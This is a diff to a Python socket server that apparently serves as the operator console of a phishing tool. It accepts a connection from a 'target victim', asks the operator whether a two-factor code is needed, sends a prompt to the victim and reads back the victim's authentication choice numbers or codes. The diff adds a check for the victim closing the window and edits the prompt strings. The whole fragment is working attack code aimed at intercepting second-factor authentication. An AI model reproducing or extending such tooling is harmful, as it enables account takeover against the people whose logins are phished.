@@ -12,16 +12,19 @@ while True:
     print(f"[+] Connected {addr}")
     while client:
         result = client.recv(1024).decode()
+        if(result == "close"):
+            print("target victim closed window")
+            break
         print(result)
         # if target closed software, server will get exception "broken pipe"
         # so if exception, loop will be broken
         try:
-            command = input("Do you need 2 factoring code [Y/n] >")
+            command = input("Do you need 2 factoring  [Y/n] >")
             if(command.lower() == "y"):
                 if(result.startswith("G")):
                     client.send("G code".encode())
                     client.recv(1024)
-                    print("eg.3[1space]12[1space]12")
+                    print("eg.3,12,12")
                     command=input("Type Two Authentication Choice Numbers >")
                     client.send(command.encode())
                     number = client.recv(1024).decode()
